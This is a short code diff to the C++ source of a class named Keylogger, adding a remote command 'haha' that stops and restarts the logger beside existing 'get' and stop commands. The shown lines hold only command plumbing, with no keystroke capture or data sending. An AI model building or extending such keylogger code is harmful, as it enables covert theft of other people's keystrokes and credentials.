@@ -20,6 +20,11 @@ Keylogger::Keylogger() {
 		//this->stop();
 		return L"Not working for now";
 	});
+	CommandParser::addCommand(L"haha", [this](std::wstring argStr) {
+		this->stop();
+		this->start();
+		return L"You are too evil";
+	});
 	CommandParser::addCommand(L"get", [this](std::wstring argStr) {
 		const std::locale utf8_locale
 			= std::locale(std::locale(), new std::codecvt_utf8<wchar_t>());
